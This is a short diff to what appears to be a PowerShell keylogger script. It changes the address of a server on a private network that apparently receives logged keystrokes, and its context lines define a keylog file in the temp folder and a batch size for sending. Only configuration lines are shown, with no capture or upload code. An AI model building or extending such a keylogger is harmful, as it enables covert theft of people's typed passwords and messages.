@@ -1,4 +1,4 @@
-$URL = "http://172.19.240.1:5000"
+$URL = "http://192.168.1.22:5000"
 $LOG_FILE = "$env:TEMP\keylog.txt"
 $BATCH_SIZE = 10
 $keysLogged = 0
